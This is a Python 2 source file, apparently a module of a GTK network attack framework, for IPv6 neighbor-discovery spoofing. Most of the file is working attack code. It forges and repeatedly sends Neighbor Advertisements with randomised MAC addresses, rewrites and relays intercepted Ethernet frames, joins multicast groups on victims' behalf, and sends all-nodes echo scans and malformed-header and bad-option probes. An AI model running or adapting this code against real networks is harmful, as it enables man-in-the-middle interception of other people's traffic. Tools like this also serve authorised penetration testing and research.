#       module_icmp6.py
#       
#       Copyright 2010 Daniel Mende <dmende@ernw.de>
#

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import random
import threading
import time

import dpkt
import pcap
import dumbnet
import struct

import IPy

import gobject
import gtk
import gtk.glade

MLDV2_LISTENER_REPORT=143
LL_ALL_ROUTERS="fe02::2"


### HELPER_FUNKTIONS ###

def ichecksum_func(data, sum=0):
    ''' Compute the Internet Checksum of the supplied data.  The checksum is
    initialized to zero.  Place the return value in the checksum field of a
    packet.  When the packet is received, check the checksum, by passing
    in the checksum field of the packet and the data.  If the result is zero,
    then the checksum has not detected an error.
    '''
    # make 16 bit words out of every two adjacent 8 bit words in the packet
    # and add them up
    for i in xrange(0,len(data),2):
        if i + 1 >= len(data):
            sum += ord(data[i]) & 0xFF
        else:
            w = ((ord(data[i]) << 8) & 0xFF00) + (ord(data[i+1]) & 0xFF)
            sum += w

    # take only 16 bits out of the 32 bit sum and add up the carries
    while (sum >> 16) > 0:
        sum = (sum & 0xFFFF) + (sum >> 16)

    # one's complement the result
    sum = ~sum

    return sum & 0xFFFF
    
class spoof_thread(threading.Thread):
    def __init__(self, parent):
        threading.Thread.__init__(self)
        self.parent = parent
        self.running = True
        self.reset = False

    def run(self):
        self.parent.log("ICMP6: Spoof thread started")        
        while self.running:
            if self.parent.dumbnet:
                for iter in self.parent.spoofs:
                    (run, entry, org_data, hosts) = self.parent.spoofs[iter]
                    if run:
                        for data in entry:
                            self.parent.dumbnet.send(data)
                            time.sleep(0.001)
            for x in xrange(self.parent.spoof_delay):
                if not self.running:
                    break
                if self.reset:
                    self.reset = False
                    break
                time.sleep(1)
        for h in xrange(3):
            for i in self.parent.spoofs:
                (run, data, org_data, hosts) = self.parent.spoofs[i]
                if run:
                    for j in org_data:
                        self.parent.dumbnet.eth.send(j)
        self.parent.log("ICMP6: Spoof thread terminated")

    def wakeup(self):
        self.reset = True

    def quit(self):
        self.running = False

class mod_class(object):
    def __init__(self, parent, platform):
        self.parent = parent
        self.platform = platform
        self.name = "icmp6"
        self.gladefile = "/modules/module_icmp6.glade"
        self.macfile = "/modules/mac.txt"
        self.hosts_liststore = gtk.ListStore(str, str, str, str)
        self.upper_add_liststore = gtk.ListStore(str, str)
        self.lower_add_liststore = gtk.ListStore(str, str)
        self.spoof_treestore = gtk.TreeStore(gtk.gdk.Pixbuf, str, str, str)
        self.mappings_liststore = gtk.ListStore(str, str)
        self.dumbnet = None
        self.spoof_thread = None
        self.macs = None
        self.mac = None
        self.spoof_delay = 30
    
    def start_mod(self):
        self.spoof_thread = spoof_thread(self)
        self.hosts = {}
        self.upper_add = {}
        self.lower_add = {}
        self.spoofs = {}
        if not self.macs:
            self.macs = self.parse_macs(self.parent.data_dir + self.macfile)

    def shut_mod(self):
        if self.spoof_thread:
            self.spoof_thread.quit()
        self.hosts_liststore.clear()
        self.upper_add_liststore.clear()
        self.lower_add_liststore.clear()
        self.spoof_treestore.clear()
        self.mappings_liststore.clear()

    def get_root(self):
        self.glade_xml = gtk.glade.XML(self.parent.data_dir + self.gladefile)
        dic = { "on_add_upper_button_clicked" : self.on_add_upper_button_clicked,
                "on_add_lower_button_clicked" : self.on_add_lower_button_clicked,
                "on_add_spoof_button_clicked" : self.on_add_spoof_button_clicked,
                "on_clear_spoof_button_clicked" : self.on_clear_spoof_button_clicked,
                "on_remove_spoof_button_clicked" : self.on_remove_spoof_button_clicked,
                "on_stop_spoof_button_clicked" : self.on_stop_spoof_button_clicked,
                "on_start_spoof_button_clicked" : self.on_start_spoof_button_clicked,
                "on_scan_start_button_clicked" : self.on_scan_start_button_clicked,
                "on_invalid_header_scan_button_clicked" : self.on_invalid_header_scan_button_clicked,
                "on_invalid_option_scan_button_clicked" : self.on_invalid_option_scan_button_clicked
                }
        self.glade_xml.signal_autoconnect(dic)

        self.hosts_treeview = self.glade_xml.get_widget("hosts_treeview")
        self.hosts_treeview.set_model(self.hosts_liststore)
        self.hosts_treeview.set_headers_visible(True)

        column = gtk.TreeViewColumn()
        column.set_title("MAC address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 0)
        self.hosts_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("IP address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.hosts_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("Flags")
        render_text = gtk.CellRendererText()
        render_text.set_property('xalign', 0.5)
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 2)
        self.hosts_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("Vendor")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 3)
        self.hosts_treeview.append_column(column)
        self.hosts_treeview.get_selection().set_mode(gtk.SELECTION_MULTIPLE)

        self.upper_add_treeview = self.glade_xml.get_widget("upper_add_treeview")
        self.upper_add_treeview.set_model(self.upper_add_liststore)
        self.upper_add_treeview.set_headers_visible(False)

        column = gtk.TreeViewColumn()
        column.set_title("MAC address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 0)
        self.upper_add_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("IP address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.upper_add_treeview.append_column(column)

        self.lower_add_treeview = self.glade_xml.get_widget("lower_add_treeview")
        self.lower_add_treeview.set_model(self.lower_add_liststore)
        self.lower_add_treeview.set_headers_visible(False)

        column = gtk.TreeViewColumn()
        column.set_title("MAC address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 0)
        self.lower_add_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("IP address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.lower_add_treeview.append_column(column)

        self.spoof_treeview = self.glade_xml.get_widget("spoof_treeview")
        self.spoof_treeview.set_model(self.spoof_treestore)
        self.spoof_treeview.set_headers_visible(False)

        column = gtk.TreeViewColumn()
        render_pixbuf = gtk.CellRendererPixbuf()
        column.pack_start(render_pixbuf, expand=False)
        column.add_attribute(render_pixbuf, 'pixbuf', 0)
        self.spoof_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.spoof_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 2)
        self.spoof_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 3)
        self.spoof_treeview.append_column(column)

        self.mappings_treeview = self.glade_xml.get_widget("mappings_treeview")
        self.mappings_treeview.set_model(self.mappings_liststore)
        self.mappings_treeview.set_headers_visible(True)
        
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=False)
        column.add_attribute(render_text, 'text', 0)
        column.set_title("Real MAC")
        self.mappings_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        column.set_title("Random MAC")
        self.mappings_treeview.append_column(column)

        self.scan_network_entry = self.glade_xml.get_widget("scan_network_entry")
        self.flood_no_spinbutton = self.glade_xml.get_widget("flood_no_spinbutton")
        self.flood_togglebutton = self.glade_xml.get_widget("flood_togglebutton")

        self.offline = self.hosts_treeview.render_icon(gtk.STOCK_NO, 1)
        self.online = self.hosts_treeview.render_icon(gtk.STOCK_YES, 1)

        return self.glade_xml.get_widget("root")

    def log(self, msg):
        self.__log(msg, self.name)

    def set_log(self, log):
        self.__log = log

    def set_ip6(self, ip, mask, ip_ll, mask_ll):
        self.ip = dumbnet.ip6_aton(ip)
        self.ip6_ll = ip_ll
        self.mask6_ll = mask_ll

    def set_dumbnet(self, dumbnet_thread):
        self.dumbnet = dumbnet_thread
        self.mac = dumbnet_thread.eth.get()

    def get_ip6_checks(self):
        return (self.check_ip6, self.input_ip6)

    def check_ip6(self, ip6):
        if dumbnet.ip6_ntoa(ip6.src) == "::":
            return (False, False)
        return (True, False)

    def input_ip6(self, eth, ip6, timestamp):
        if eth.src == self.mac:
            return
        
        if ip6.nxt == dpkt.ip.IP_PROTO_ICMP6:
            icmp6 = dpkt.icmp6.ICMP6(str(ip6.data))
            mac = dumbnet.eth_ntoa(str(eth.src))
            if self.mac:
                if icmp6.type == dpkt.icmp6.ND_NEIGHBOR_SOLICIT:
                    ip6_dst = dumbnet.ip6_ntoa(str(icmp6.data)[4:20])
                    for h in self.hosts:
                        if mac == h:
                            (ip6_src, rand_mac_src, iter_src, reply_src) = self.hosts[mac]
                            for i in self.hosts:
                                (ip6, rand_mac_dst, iter_dst, reply_dst) = self.hosts[i]
                                if ip6_dst == ip6:
                                    break
                            if reply_src and reply_dst:
                                _icmp6 = dpkt.icmp6.ICMP6(  type=dpkt.icmp6.ND_NEIGHBOR_SOLICIT,
                                                            code=0,
                                                            data=struct.pack("!L16sBB6s", 0x60000000, dumbnet.ip6_aton(ip6_dst), 1, 1, rand_mac_dst)
                                                            )
                                _eth = dpkt.ethernet.Ethernet(  dst=eth.src,
                                                                src=dumbnet.eth_aton(rand_mac_dst),
                                                                type=dpkt.ip.IP_PROTO_IP6,
                                                                data=str(_icmp6)
                                                                )
                                self.dumbnet.send(str(_eth))
                                break
            if icmp6.type == dpkt.icmp6.ND_ROUTER_ADVERT:
                if mac in self.hosts:
                    (ip, random_mac, iter, reply) = self.hosts[mac]
                    self.hosts_liststore.set(iter, 2, "R")
            for h in self.hosts:
                if mac == h:
                    return
                (ip, random_mac, iter, reply) = self.hosts[h]
                if mac == random_mac:
                    return
            rand_mac = [ 0x00, random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff) ]
            rand_mac = ':'.join(map(lambda x: "%02x" % x, rand_mac))
            iter = self.hosts_liststore.append([mac, dumbnet.ip6_ntoa(ip6.src), "", self.mac_to_vendor(mac)])
            self.hosts[mac] = (dumbnet.ip6_ntoa(ip6.src), rand_mac, iter, False)
            self.mappings_liststore.append([mac, rand_mac])

    def get_eth_checks(self):
        return (self.check_eth, self.input_eth)

    def check_eth(self, eth):
        if eth.type == dpkt.ethernet.ETH_TYPE_IP6:
            return (True, False)
        return (False, False)

    def input_eth(self, eth, timestamp):
        src = dumbnet.eth_ntoa(str(eth.src))
        dst = dumbnet.eth_ntoa(str(eth.dst))
        good = False
        for h in self.hosts:
            (ip, rand_mac, iter, reply) = self.hosts[h]
            if src == h:
                eth.src = dumbnet.eth_aton(rand_mac)
                ref_src = ip
                if good:
                    self.dumbnet.send(str(eth))
                    self.spoof_treestore.foreach(self.inc_packet_counter, (ref_src, ref_dst))
                    return
                else:
                    good = True
            if dst == rand_mac:
                eth.dst = dumbnet.eth_aton(h)
                ref_dst = ip
                if good:
                    self.dumbnet.send(str(eth))
                    self.spoof_treestore.foreach(self.inc_packet_counter, (ref_src, ref_dst))
                    return
                else:
                    good = True

    def inc_packet_counter(self, model, path, iter, user_data):
        if model.iter_has_child(iter):
            return False
        (ref_src, ref_dst) = user_data
        (src, dst, count) = model.get(iter, 1, 2, 3)
        if (src == ref_src and dst == ref_dst) or (dst == ref_src and src == ref_dst):
            self.spoof_treestore.set(iter, 3, str(int(count) + 1))
            return True
        return False

    def parse_macs(self, file):
        macs = {}
        f = open(file, "r")
        for l in f:
            s = l.split()
            if len(s) < 2:
                continue
            macs[s[0]] = " ".join(s[1:])
        return macs

    def mac_to_vendor(self, mac):
        mac = mac.replace(":", "-")
        try:
            vendor = self.macs[mac[0:8].upper()]
        except:
            vendor = "Unknown"
        return vendor

    # SIGNALS #

    def on_add_upper_button_clicked(self, data):
        select = self.hosts_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            host = model.get_value(model.get_iter(i), 0)
            if host not in self.upper_add:
                if host not in self.lower_add:
                    (ip, rand_mac, iter, reply) = self.hosts[host]
                    iter = self.upper_add_liststore.append([host, ip])
                    self.upper_add[host] = (ip, rand_mac, iter)

    def on_add_lower_button_clicked(self, data):
        select = self.hosts_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            host = model.get_value(model.get_iter(i), 0)
            if host not in self.upper_add:
                if host not in self.lower_add:
                    (ip, rand_mac, iter, reply) = self.hosts[host]
                    iter = self.lower_add_liststore.append([host, ip])
                    self.lower_add[host] = (ip, rand_mac, iter)

    def on_add_spoof_button_clicked(self, data):
        if not len(self.upper_add):
            return
        if not len(self.lower_add):
            return
        parent = self.spoof_treestore.append(None, [self.offline, "%i spoofs" % (len(self.upper_add) * len(self.lower_add)), None, None])
        cur = self.spoof_treestore.get_string_from_iter(parent)
        data = []
        org_data = []
        hosts = []
        for host_upper in self.upper_add:
            (ip_upper, rand_mac_upper, iter_upper) = self.upper_add[host_upper]
            for host_lower in self.lower_add:
                (ip_lower, rand_mac_lower, iter_lower) = self.lower_add[host_lower]
                self.spoof_treestore.append(parent, [None, ip_upper, ip_lower, "0"])
                
                advert = struct.pack("!I16sBB6s", 0x60000000, dumbnet.ip6_aton(ip_upper), 2, 1, dumbnet.eth_aton(rand_mac_upper))
                icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ND_NEIGHBOR_ADVERT,
                                            code=0,
                                            data=advert
                                            )
                icmp6_str = str(icmp6)
                ip6 = dpkt.ip6.IP6( src=dumbnet.ip6_aton(ip_upper),
                                    dst=dumbnet.ip6_aton(ip_lower),
                                    nxt=dpkt.ip.IP_PROTO_ICMP6,
                                    hlim=255,
                                    data=icmp6,
                                    plen=len(icmp6_str)
                                    )
                ip6.extension_hdrs={}
                for i in dpkt.ip6.ext_hdrs:
                    ip6.extension_hdrs[i]=None
                ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
                icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
                eth = dpkt.ethernet.Ethernet(   dst=dumbnet.eth_aton(host_lower),
                                                src=dumbnet.eth_aton(rand_mac_upper),
                                                data=str(ip6),
                                                type=dpkt.ethernet.ETH_TYPE_IP6
                                                )
                data.append(str(eth))
                advert = struct.pack("!I16sBB6s", 0x60000000, dumbnet.ip6_aton(ip_lower), 2, 1, dumbnet.eth_aton(host_upper))
                icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ND_NEIGHBOR_ADVERT,
                                            code=0,
                                            data=advert
                                            )
                icmp6_str = str(icmp6)
                ip6 = dpkt.ip6.IP6( src=dumbnet.ip6_aton(ip_upper),
                                    dst=dumbnet.ip6_aton(ip_lower),
                                    nxt=dpkt.ip.IP_PROTO_ICMP6,
                                    hlim=255,
                                    data=icmp6,
                                    plen=len(icmp6_str)
                                    )
                ip6.extension_hdrs={}
                for i in dpkt.ip6.ext_hdrs:
                    ip6.extension_hdrs[i]=None
                ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
                icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
                eth = dpkt.ethernet.Ethernet(   dst=dumbnet.eth_aton(host_lower),
                                                src=dumbnet.eth_aton(host_upper),
                                                data=str(ip6),
                                                type=dpkt.ethernet.ETH_TYPE_IP6
                                                )
                org_data.append(str(eth))
                

                advert = struct.pack("!I16sBB6s", 0x60000000, dumbnet.ip6_aton(ip_lower), 2, 1, dumbnet.eth_aton(rand_mac_lower))
                icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ND_NEIGHBOR_ADVERT,
                                            code=0,
                                            data=advert
                                            )
                icmp6_str = str(icmp6)
                ip6 = dpkt.ip6.IP6( src=dumbnet.ip6_aton(ip_lower),
                                    dst=dumbnet.ip6_aton(ip_upper),
                                    nxt=dpkt.ip.IP_PROTO_ICMP6,
                                    hlim=255,
                                    data=icmp6,
                                    plen=len(icmp6_str)
                                    )
                ip6.extension_hdrs={}
                for i in dpkt.ip6.ext_hdrs:
                    ip6.extension_hdrs[i]=None
                ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
                icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
                eth = dpkt.ethernet.Ethernet(   dst=dumbnet.eth_aton(host_upper),
                                                src=dumbnet.eth_aton(rand_mac_lower),
                                                data=str(ip6),
                                                type=dpkt.ethernet.ETH_TYPE_IP6
                                                )
                data.append(str(eth))
                advert = struct.pack("!I16sBB6s", 0x60000000, dumbnet.ip6_aton(ip_lower), 2, 1, dumbnet.eth_aton(host_lower))
                icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ND_NEIGHBOR_ADVERT,
                                            code=0,
                                            data=advert
                                            )
                icmp6_str = str(icmp6)
                ip6 = dpkt.ip6.IP6( src=dumbnet.ip6_aton(ip_lower),
                                    dst=dumbnet.ip6_aton(ip_upper),
                                    nxt=dpkt.ip.IP_PROTO_ICMP6,
                                    hlim=255,
                                    data=icmp6,
                                    plen=len(icmp6_str)
                                    )
                ip6.extension_hdrs={}
                for i in dpkt.ip6.ext_hdrs:
                    ip6.extension_hdrs[i]=None
                ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
                icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
                eth = dpkt.ethernet.Ethernet(   dst=dumbnet.eth_aton(host_upper),
                                                src=dumbnet.eth_aton(host_lower),
                                                data=str(ip6),
                                                type=dpkt.ethernet.ETH_TYPE_IP6
                                                )
                org_data.append(str(eth))
                
            hosts.append(host_upper)

            mld = struct.pack("!xxHBBH16s", 1, 4, 0, 0, dumbnet.ip6_aton("ff02::1:ff00:0000")[:13] + dumbnet.ip6_aton(ip_upper)[13:])
            icmp6 = dpkt.icmp6.ICMP6(   type=143,
                                        code=0,
                                        data=mld
                                        )
            icmp6_str = str(icmp6)
            ip6 = dpkt.ip6.IP6( src=dumbnet.ip6_aton(ip_upper),
                                dst=dumbnet.ip6_aton("ff02::16"),
                                nxt=dpkt.ip.IP_PROTO_HOPOPTS,
                                hlim=1,
                                data=icmp6,
                                plen=len(icmp6_str) + 8
                                )
            ip6.extension_hdrs={}
            for i in dpkt.ip6.ext_hdrs:
                ip6.extension_hdrs[i]=None
            ip6.extension_hdrs[dpkt.ip.IP_PROTO_HOPOPTS] = dpkt.ip6.IP6HopOptsHeader(nxt=dpkt.ip.IP_PROTO_ICMP6, data=struct.pack("!BBHBB", 5, 2, 0, 1, 0))
            
            ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, len(icmp6_str), 
            dpkt.ip.IP_PROTO_ICMP6)
            icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
            eth = dpkt.ethernet.Ethernet(   dst=dumbnet.eth_aton("33:33:00:00:00:16"),
                                            src=self.mac,
                                            data=str(ip6),
                                            type=dpkt.ethernet.ETH_TYPE_IP6
                                            )
            self.dumbnet.send(str(eth))
            self.log("ICMP6: Joined multicast group " + dumbnet.ip6_ntoa(dumbnet.ip6_aton("ff02::1:ff00:0000")[:13] + dumbnet.ip6_aton(ip_upper)[13:]))
        for host_lower in self.lower_add:
            hosts.append(host_lower)
            (ip_lower, rand_mac_lower, iter_lower) = self.lower_add[host_lower]
            mld = struct.pack("!xxHBBH16s", 1, 4, 0, 0, dumbnet.ip6_aton("ff02::1:ff00:0000")[:13] + dumbnet.ip6_aton(ip_lower)[13:])
            icmp6 = dpkt.icmp6.ICMP6(   type=143,
                                        code=0,
                                        data=mld
                                        )
            icmp6_str = str(icmp6)
            ip6 = dpkt.ip6.IP6( src=dumbnet.ip6_aton(ip_lower),
                                dst=dumbnet.ip6_aton("ff02::16"),
                                nxt=dpkt.ip.IP_PROTO_HOPOPTS,
                                hlim=1,
                                data=icmp6,
                                plen=len(icmp6_str) + 8
                                )
            ip6.extension_hdrs={}
            for i in dpkt.ip6.ext_hdrs:
                ip6.extension_hdrs[i]=None
            ip6.extension_hdrs[dpkt.ip.IP_PROTO_HOPOPTS] = dpkt.ip6.IP6HopOptsHeader(nxt=dpkt.ip.IP_PROTO_ICMP6, data=struct.pack("!BBHBB", 5, 2, 0, 1, 0))
            
            ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, len(icmp6_str), 
            dpkt.ip.IP_PROTO_ICMP6)
            icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
            eth = dpkt.ethernet.Ethernet(   dst=dumbnet.eth_aton("33:33:00:00:00:16"),
                                            src=self.mac,
                                            data=str(ip6),
                                            type=dpkt.ethernet.ETH_TYPE_IP6
                                            )
            self.dumbnet.send(str(eth))
            self.log("ICMP6: Joined multicast group " + dumbnet.ip6_ntoa(dumbnet.ip6_aton("ff02::1:ff00:0000")[:13] + dumbnet.ip6_aton(ip_lower)[13:]))
        self.spoofs[cur] = (False, data, org_data, hosts)
        self.upper_add = {}
        self.lower_add = {}
        self.upper_add_liststore.clear()
        self.lower_add_liststore.clear()

    def on_clear_spoof_button_clicked(self, data):
        self.upper_add = {}
        self.lower_add = {}
        self.upper_add_liststore.clear()
        self.lower_add_liststore.clear()

    def on_remove_spoof_button_clicked(self, data):
        self.on_stop_spoof_button_clicked(data)
        select = self.spoof_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            parent = model.iter_parent(model.get_iter(i))
            if not parent:
                parent = model.get_iter(i)
            del self.spoofs[model.get_string_from_iter(parent)]
            model.remove(parent)

    def on_stop_spoof_button_clicked(self, data):
        select = self.spoof_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            parent = model.iter_parent(model.get_iter(i))
            if not parent:
                parent = model.get_iter(i)
            self.spoof_treestore.set_value(parent, 0, self.offline)
            cur = self.spoof_treestore.get_string_from_iter(parent)
            (run, data, org_data, hosts) = self.spoofs[cur]
            if run:
                self.spoofs[cur] = (False, data, org_data, hosts)
                for j in org_data:
                    self.dumbnet.eth.send(j)
            for i in hosts:
                (ip, rand_mac, iter, reply) = self.hosts[i]
                self.hosts[i] = (ip, rand_mac, iter, False)

    def on_start_spoof_button_clicked(self, data):
        select = self.spoof_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            parent = model.iter_parent(model.get_iter(i))
            if not parent:
                parent = model.get_iter(i)
            self.spoof_treestore.set_value(parent, 0, self.online)
            cur = self.spoof_treestore.get_string_from_iter(parent)
            (run, data, org_data, hosts) = self.spoofs[cur]
            self.spoofs[cur] = (True, data, org_data, hosts)
            for i in hosts:
                (ip, rand_mac, iter, reply) = self.hosts[i]
                self.hosts[i] = (ip, rand_mac, iter, True)
        if not self.spoof_thread.is_alive():
            self.spoof_thread.start()
        self.spoof_thread.wakeup()

    def on_scan_start_button_clicked(self, data):
        echo6 = dpkt.icmp6.ICMP6.Echo(  id=1234,
                                        seq=56789,
                                        data="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                        )
        icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ICMP6_ECHO_REQUEST,
                                    code=0,
                                    data=echo6
                                    )
        icmp6_str = str(icmp6)
        ip6 = dpkt.ip6.IP6( src=dumbnet.ip6_aton(self.ip6_ll),
                            dst=dumbnet.ip6_aton("ff02::1"),
                            nxt=dpkt.ip.IP_PROTO_ICMP6,
                            hlim=64,
                            data=icmp6,
                            plen=len(icmp6_str)
                            )
        ip6.extension_hdrs={}
        for i in dpkt.ip6.ext_hdrs:
            ip6.extension_hdrs[i]=None
        ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
        icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
        eth = dpkt.ethernet.Ethernet(   src=self.mac,
                                        dst=dumbnet.eth_aton("33:33:00:00:00:01"),
                                        data=str(ip6),
                                        type=dpkt.ethernet.ETH_TYPE_IP6
                                        )
        self.dumbnet.send(str(eth))

    def on_invalid_header_scan_button_clicked(self, data):
        echo6 = dpkt.icmp6.ICMP6.Echo(  id=1234,
                                        seq=56789,
                                        data="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                        )
        icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ICMP6_ECHO_REQUEST,
                                    code=0,
                                    data=echo6
                                    )
        icmp6_str = str(icmp6)
        rand = "".join([ chr(random.randint(0x00, 0xff)) for i in xrange(14) ])
        data_str = struct.pack("!BB14s", dpkt.ip.IP_PROTO_ICMP6, 1, rand) + icmp6_str
        ip6 = dpkt.ip6.IP6( src=dumbnet.ip6_aton(self.ip6_ll),
                            dst=dumbnet.ip6_aton("ff02::1"),
                            nxt=159,
                            hlim=64,
                            plen=len(data_str)
                            )
        ip6.extension_hdrs={}
        for i in dpkt.ip6.ext_hdrs:
            ip6.extension_hdrs[i]=None
        ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
        icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
        ip6.data = data_str
        eth = dpkt.ethernet.Ethernet(   src=self.mac,
                                        dst=dumbnet.eth_aton("33:33:00:00:00:01"),
                                        data=str(ip6),
                                        type=dpkt.ethernet.ETH_TYPE_IP6
                                        )
        self.dumbnet.send(str(eth))

    def on_invalid_option_scan_button_clicked(self, data):
        echo6 = dpkt.icmp6.ICMP6.Echo(  id=1234,
                                        seq=56789,
                                        data="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                        )
        icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ICMP6_ECHO_REQUEST,
                                    code=0,
                                    data=echo6
                                    )
        icmp6_str = str(icmp6)
        ip6 = dpkt.ip6.IP6( src=dumbnet.ip6_aton(self.ip6_ll),
                            dst=dumbnet.ip6_aton("ff02::1"),
                            nxt=dpkt.ip.IP_PROTO_HOPOPTS,
                            hlim=1,
                            data=icmp6,
                            plen=len(icmp6_str)
                            )
        ip6.extension_hdrs={}
        for i in dpkt.ip6.ext_hdrs:
            ip6.extension_hdrs[i]=None
        rand = "".join([ chr(random.randint(0x00, 0xff)) for i in xrange(13) ])
        ip6.extension_hdrs[dpkt.ip.IP_PROTO_HOPOPTS] = dpkt.ip6.IP6HopOptsHeader(nxt=dpkt.ip.IP_PROTO_ICMP6, len=1, data=struct.pack("!B13s", 1, rand))
        ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, len(icmp6_str), dpkt.ip.IP_PROTO_ICMP6)
        icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
        eth = dpkt.ethernet.Ethernet(   dst=dumbnet.eth_aton("33:33:00:00:00:01"),
                                        src=self.mac,
                                        data=str(ip6),
                                        type=dpkt.ethernet.ETH_TYPE_IP6
                                        )
        self.dumbnet.send(str(eth))

    def get_config_dict(self):
        return {    "spoof_delay" : {   "value" : self.spoof_delay,
                                        "type" : "int",
                                        "min" : 1,
                                        "max" : 100
                                        }
                    }

    def set_config_dict(self, dict):
        if dict:
            self.spoof_delay = dict["spoof_delay"]["value"]
